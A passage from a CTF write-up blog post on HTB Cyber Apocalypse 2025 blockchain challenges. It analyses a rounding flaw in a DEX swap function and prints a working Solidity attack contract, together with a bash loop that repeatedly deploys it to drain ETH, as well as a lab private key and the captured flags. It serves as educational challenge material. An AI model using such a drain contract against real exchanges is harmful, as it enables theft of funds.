+</span></span><span style="display:flex;"><span>logs                 <span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;address&#34;</span>:<span style="color:#e6db74">&#34;0x84346fae15aabc3a7093c97c4faf28c1505d4b4d&#34;</span>,<span style="color:#e6db74">&#34;topics&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;0xebade57dfc06b2a07c4dc88f21eda0fe7af62c34f1a6b4b56e09b32a2bda0cc7&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#e6db74">&#34;0x000000000000000000000000df984b43be2507f4da173d0b51b00248cf9b323c&#34;</span>,<span style="color:#e6db74">&#34;blockHash&#34;</span>:<span style="color:#e6db74">&#34;0x97cf5db1ceff37e36419bf38c20363d7c0661acc51f3201ffec236de04c21efc&#34;</span>,<span style="color:#e6db74">&#34;blockNumber&#34;</span>:<span style="color:#e6db74">&#34;0x8&#34;</span>,<span style="color:#e6db74">&#34;blockTimestamp&#34;</span>:<span style="color:#e6db74">&#34;0x67dd9a40&#34;</span>,<span style="color:#e6db74">&#34;transactionHash&#34;</span>:<span style="color:#e6db74">&#34;0xd77ad71cda0faa7e1357510248b0fe83c99cac22043bb63d1bdf2e4666140703&#34;</span>,<span style="color:#e6db74">&#34;transactionIndex&#34;</span>:<span style="color:#e6db74">&#34;0x0&#34;</span>,<span style="color:#e6db74">&#34;logIndex&#34;</span>:<span style="color:#e6db74">&#34;0x0&#34;</span>,<span style="color:#e6db74">&#34;removed&#34;</span>:false<span style="color:#f92672">}]</span>
+</span></span><span style="display:flex;"><span>logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000002000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010
+</span></span><span style="display:flex;"><span>root                 
+</span></span><span style="display:flex;"><span>status               <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>success<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>transactionHash      0xd77ad71cda0faa7e1357510248b0fe83c99cac22043bb63d1bdf2e4666140703
+</span></span><span style="display:flex;"><span>transactionIndex     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>type                 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>blobGasPrice         <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>blobGasUsed          
+</span></span><span style="display:flex;"><span>authorizationList    
+</span></span><span style="display:flex;"><span>to                   0xdF984b43Be2507f4dA173D0b51B00248cf9B323c
+</span></span></code></pre></div><p>We should&rsquo;ve defeated Eldorion, let&rsquo;s check:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 94.237.54.176 <span style="color:#ae81ff">59994</span> -vn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>94.237.54.176<span style="color:#f92672">]</span> <span style="color:#ae81ff">59994</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> - Get connection information
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> - Restart instance
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - Get flag
+</span></span><span style="display:flex;"><span>Select action <span style="color:#f92672">(</span>enter number<span style="color:#f92672">)</span>: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}</code></p>
+<h2 id="blockchain-heliosdex---easy">Blockchain: HeliosDEX - Easy<a href="#blockchain-heliosdex---easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>HeliosDEX was a bit more subtle. It involved a currency exchange. Again, ChatGPT identified the vulnerability for me:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">swapForHLS</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">underHeliosEye</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">grossHLS</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">mulDiv</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">exchangeRatioHLS</span>, <span style="color:#ae81ff">1e18</span>, Math.<span style="color:#a6e22e">Rounding</span>(<span style="color:#ae81ff">3</span>));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">fee</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">grossHLS</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">feeBps</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">10_000</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">netHLS</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">grossHLS</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">fee</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">netHLS</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">reserveHLS</span>, <span style="color:#e6db74">&#34;HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">reserveHLS</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">netHLS</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">heliosLuminaShards</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">netHLS</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">emit</span> <span style="color:#a6e22e">HeliosBarter</span>(<span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">heliosLuminaShards</span>), <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">netHLS</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This first line in <code>swapForHLS()</code> is suspicious:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">grossHLS</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">mulDiv</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">exchangeRatioHLS</span>, <span style="color:#ae81ff">1e18</span>, Math.<span style="color:#a6e22e">Rounding</span>(<span style="color:#ae81ff">3</span>));
+</span></span></code></pre></div><p>The <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.so">OpenZeppelin Math library</a> defines <code>Math.Rounding</code> which accepts:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">Rounding</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Floor</span>, <span style="color:#75715e">// Toward negative infinity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Ceil</span>, <span style="color:#75715e">// Toward positive infinity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Trunc</span>, <span style="color:#75715e">// Toward zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Expand</span> <span style="color:#75715e">// Away from zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p><code>Math.mulDiv</code> is defined as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">mulDiv</span>(<span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">y</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">denominator</span>, <span style="color:#a6e22e">Rounding</span> <span style="color:#a6e22e">rounding</span>) <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">pure</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint256</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mulDiv</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">y</span>, <span style="color:#a6e22e">denominator</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">SafeCast</span>.<span style="color:#a6e22e">toUint</span>(<span style="color:#a6e22e">unsignedRoundsUp</span>(<span style="color:#a6e22e">rounding</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">mulmod</span>(<span style="color:#a6e22e">x</span>, <span style="color:#a6e22e">y</span>, <span style="color:#a6e22e">denominator</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>By using <code>Math.Rounding(3)</code>, we set it to expand &ldquo;away from zero&rdquo;, this can lead to catastrophic impact on a currency exchange :)</p>
+<p>Essentially, we can abuse the rounding error from <code>Math.round(3)</code> to exchange ETH for HLS and refund back at a profit margin.</p>
+<p>We deploy this smart contract to exploit it (Thanks ChatGPT):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IHeliosDEX</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">swapForHLS</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">oneTimeRefund</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">item</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">amount</span>) <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reserveHLS</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint256</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">heliosLuminaShards</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">address</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IHLS</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">spender</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">amount</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">account</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint256</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">amount</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">ProfitAttack</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">IHeliosDEX</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">dex</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">IHLS</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">hls</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">player</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_dex</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_hls</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_player</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dex</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IHeliosDEX</span>(<span style="color:#a6e22e">_dex</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">hls</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IHLS</span>(<span style="color:#a6e22e">_hls</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">player</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_player</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Send ETH&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Buy HLS cheaply using swapForHLS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dex</span>.<span style="color:#a6e22e">swapForHLS</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>}();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Approve refund
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">balance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hls</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">hls</span>.<span style="color:#a6e22e">approve</span>(<span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">dex</span>), <span style="color:#a6e22e">balance</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Refund once for ETH profit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dex</span>.<span style="color:#a6e22e">oneTimeRefund</span>(<span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">hls</span>), <span style="color:#a6e22e">balance</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Send profit to player
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">payable</span>(<span style="color:#a6e22e">player</span>).<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can then connect:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 83.136.251.141 -vn <span style="color:#ae81ff">42695</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>83.136.251.141<span style="color:#f92672">]</span> <span style="color:#ae81ff">42695</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> - Get connection information
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> - Restart instance
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - Get flag
+</span></span><span style="display:flex;"><span>Select action <span style="color:#f92672">(</span>enter number<span style="color:#f92672">)</span>: <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No running node found. Launching new node...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Player Private Key : 0xc031faffc780a4d9d48c49edcd21535008da82ee2ec73269444db08c938611d0
+</span></span><span style="display:flex;"><span>Player Address     : 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6
+</span></span><span style="display:flex;"><span>Target contract    : 0x0cC0e81b5B6a9F819cDA840Fe0316885fb9d983d
+</span></span><span style="display:flex;"><span>Setup contract     : 0x0D7b82AD0C19AD24b76230F280fCb1B660F91442
+</span></span></code></pre></div><p>Setup our environment:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export PRIVATE_KEY<span style="color:#f92672">=</span>0xc031faffc780a4d9d48c49edcd21535008da82ee2ec73269444db08c938611d0
+</span></span><span style="display:flex;"><span>export RPC_URL<span style="color:#f92672">=</span>http://83.136.251.141:42695
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we have 12 ETH, we need to reach 20 ETH to win:</span>
+</span></span><span style="display:flex;"><span>cast balance 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6 --rpc-url $RPC_URL
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12000000000000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># we get address of HLS from target contract</span>
+</span></span><span style="display:flex;"><span>cast call --rpc-url $RPC_URL 0x0cC0e81b5B6a9F819cDA840Fe0316885fb9d983d  <span style="color:#e6db74">&#34;heliosLuminaShards()(address)&#34;</span>
+</span></span><span style="display:flex;"><span>0x06e30350e4ae7B421b6391DEDe99cB353AaeCCD5
+</span></span></code></pre></div><p>We use a simple bash loop to deploy our contract, grab the &ldquo;Deployed to&rdquo; address and execute it with a 0.1 ETH amount to abuse the rounding error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..120<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>attack_contract<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>forge create ProfitAttack <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --private-key $PRIVATE_KEY <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --rpc-url $RPC_URL --broadcast <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --constructor-args 0x0cC0e81b5B6a9F819cDA840Fe0316885fb9d983d 0x06e30350e4ae7B421b6391DEDe99cB353AaeCCD5 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6 | grep <span style="color:#e6db74">&#39;Deployed to&#39;</span> | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f3<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>echo $attack_contract
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast send $attack_contract <span style="color:#e6db74">&#34;attack()&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --value 0.01ether <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --private-key $PRIVATE_KEY <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --rpc-url $RPC_URL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p><img src="/posts/htb-cyber-apocalypse-2025-writeup/blockchain_infinite_eth.png"></p>
+<p>We can see our profits coming while our DHS store remaining untouched:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cast balance 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6 --rpc-url $RPC_URL
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19813764055000000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast balance 0x5a60330e15d511c7c93932Da9eEAef0ABd40F3D6 --rpc-url $RPC_URL
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20169592103000000000</span>
+</span></span></code></pre></div><p>At 20 ETH, we satisfy the win condition and grab our flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 83.136.251.141 -vn <span style="color:#ae81ff">42695</span>                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>83.136.251.141<span style="color:#f92672">]</span> <span style="color:#ae81ff">42695</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> - Get connection information
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> - Restart instance
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> - Get flag
+</span></span><span style="display:flex;"><span>Select action <span style="color:#f92672">(</span>enter number<span style="color:#f92672">)</span>: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="flag">FLAG<a href="#flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><code>HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}</code></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/hack-my-bot-pwnme-2025-ctf/">
+                <span class="button__text">Hack My Bot Writeup for Beginners (PwnMe 2025 CTF)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="//localhost:1313/assets/main.js"></script>
+<script src="//localhost:1313/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
